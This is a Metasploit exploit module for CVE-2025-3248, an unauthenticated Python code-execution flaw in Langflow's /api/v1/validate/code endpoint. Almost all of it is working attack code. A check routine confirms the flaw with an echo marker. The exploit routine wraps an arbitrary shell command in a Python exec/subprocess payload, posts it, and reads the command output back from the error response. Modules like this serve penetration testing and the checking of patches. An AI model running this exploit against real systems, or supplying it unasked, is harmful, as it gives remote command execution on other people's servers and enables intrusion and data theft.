##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Langflow <= 1.2.x / 1.3.0 Unauthenticated Python Code Execution',
        'Description' => %q{
          Langflow versions <= 1.2.x (and early 1.3.0 builds) expose the endpoint
          /api/v1/validate/code which evaluates arbitrary Python code using exec().
          No authentication is required. By sending a crafted JSON payload, an
          attacker can execute arbitrary system commands via Python subprocess.

          This module exploits that vulnerability to gain unauthenticated remote
          code execution as the user running the Langflow service.
        },
        'Author' => [
          'Raghad Abdallah Al-syouf', # discovery, PoC
          'VeryLazyTech',             # additional analysis
          'ZeroForge'                 # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-3248'],
          ['URL', 'https://www.exploit-db.com/exploits/52364'],
          ['URL', 'https://www.exploit-db.com/exploits/52262'],
          ['URL', 'https://github.com/logspace-ai/langflow']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Targets' => [
          ['Automatic', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-07-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(7860),
        OptString.new('TARGETURI', [true, 'Application base path', '/'])
      ]
    )
  end

  def check
    # Send a benign payload that echoes a random marker
    marker = Rex::Text.rand_text_alpha(8)
    check_cmd = "echo #{marker}"

    res = send_exploit_request(check_cmd)
    return CheckCode::Unknown('Target did not respond') unless res

    unless res.code == 200
      return CheckCode::Safe("Unexpected HTTP response #{res.code}")
    end

    begin
      body = JSON.parse(res.body)
    rescue JSON::ParserError
      return CheckCode::Safe('Invalid JSON response')
    end

    errors = body.dig('function', 'errors')
    return CheckCode::Safe('Missing function errors') unless errors.is_a?(Array) && errors.any?

    first_error = errors.first.to_s
    if first_error.include?(marker)
      return CheckCode::Vulnerable('Arbitrary code execution confirmed')
    end

    CheckCode::Detected('Endpoint exists but no marker returned')
  end

  def exploit
    # Build the system command from the chosen payload
    cmd = payload.encoded
    # Escape backslashes and double quotes for inclusion inside a Python
    # double-quoted string literal that is itself inside a JSON string.
    escaped_cmd = cmd.gsub('\\', '\\\\\\\\').gsub('"', '\\"')
    python_code = "def run(cd=exec('raise Exception(__import__(\"subprocess\").check_output(\"#{escaped_cmd}\", shell=True))')): pass"

    print_status("Sending crafted payload to #{normalize_uri(target_uri.path, '/api/v1/validate/code')}")

    res = send_exploit_request(python_code)
    fail_with(Failure::Unreachable, 'Target did not respond') unless res
    fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{res.code}") unless res.code == 200

    begin
      body = JSON.parse(res.body)
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, 'Failed to parse JSON response')
    end

    errors = body.dig('function', 'errors')
    unless errors.is_a?(Array) && errors.any?
      fail_with(Failure::UnexpectedReply, 'Response does not contain function errors')
    end

    # The output is embedded in a Python bytes representation, e.g. b'output\n'
    raw_output = errors.first.to_s
    if raw_output.start_with?("b'") && raw_output.end_with?("'")
      output = raw_output[2...-1]
      print_good("Command output:\n#{output}")
    else
      print_warning("Unexpected error format: #{raw_output}")
    end
  end

  private

  # Helper to send the JSON payload to the vulnerable endpoint
  def send_exploit_request(code)
    payload_json = JSON.generate({ 'code' => code })
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api/v1/validate/code'),
      'ctype' => 'application/json',
      'data' => payload_json,
      'headers' => {
        'User-Agent' => 'Langflow-RCE-Scanner'
      }
    )
  end

end
